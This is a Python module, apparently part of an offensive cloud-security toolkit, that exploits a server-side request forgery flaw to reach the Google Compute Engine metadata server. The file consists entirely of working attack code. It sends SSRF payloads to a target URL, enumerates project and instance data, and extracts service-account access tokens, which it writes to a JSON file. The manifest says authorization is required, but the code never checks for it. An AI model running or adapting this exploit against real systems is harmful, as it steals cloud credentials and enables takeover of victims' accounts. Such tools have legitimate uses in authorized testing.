"""GCP Metadata SSRF — exploit SSRF to reach GCE metadata server."""


import json
import os
import sys
from datetime import datetime, timezone, UTC
from typing import Any

import requests


MANIFEST = {
    "capability_id": "cloudxpl.gcp.metadata_ssrf.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["http_requests_via_target"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1552.005"],
}

GCE_METADATA = "http://metadata.google.internal/computeMetadata/v1/"
METADATA_PATHS = [
    "project/project-id",
    "project/numeric-project-id",
    "instance/hostname",
    "instance/zone",
    "instance/machine-type",
    "instance/service-accounts/",
    "instance/network-interfaces/0/access-configs/0/external-ip",
    "instance/attributes/",
]


def _ssrf_fetch(target_url: str, meta_path: str, timeout: int = 10) -> str | None:
    meta_url = f"{GCE_METADATA}{meta_path}"

    payloads = [
        meta_url,
        f"http://169.254.169.254/computeMetadata/v1/{meta_path}",
        f"http://metadata.google.internal./computeMetadata/v1/{meta_path}",
    ]

    for payload in payloads:
        try:
            sep = "&" if "?" in target_url else "?"
            url = f"{target_url}{sep}url={payload}"
            resp = requests.get(url, timeout=timeout, allow_redirects=False)
            if resp.status_code == 200 and resp.text:
                return resp.text
        except requests.RequestException:
            continue
    return None


def run(args: Any) -> int:
    if not args.target:
        print("[!] --target URL required for metadata SSRF", file=sys.stderr)
        return 1

    print(f"[*] GCP Metadata SSRF via {args.target}")
    results: dict[str, Any] = {"target": args.target, "findings": {}}

    for path in METADATA_PATHS:
        data = _ssrf_fetch(args.target, path)
        if data:
            results["findings"][path] = data
            print(f"  [+] {path}: {data[:80]}{'...' if len(data) > 80 else ''}")

    sa_listing = results["findings"].get("instance/service-accounts/")
    if sa_listing:
        for sa in sa_listing.strip().split("\n"):
            sa = sa.strip().rstrip("/")
            if sa:
                token_data = _ssrf_fetch(
                    args.target,
                    f"instance/service-accounts/{sa}/token"
                )
                if token_data:
                    results["findings"][f"token/{sa}"] = token_data
                    print(f"  [!] ACCESS TOKEN for {sa} extracted!")

    if results["findings"]:
        os.makedirs(args.output, exist_ok=True)
        ts = datetime.now(UTC).strftime("%Y%m%d_%H%M%S")
        out_path = os.path.join(args.output, f"gcp_metadata_ssrf_{ts}.json")
        with open(out_path, "w") as fh:
            json.dump(results, fh, indent=2, default=str)
        print(f"[+] {len(results['findings'])} metadata paths reached → {out_path}")
    else:
        print("[-] No GCE metadata retrieved via SSRF")

    return 0
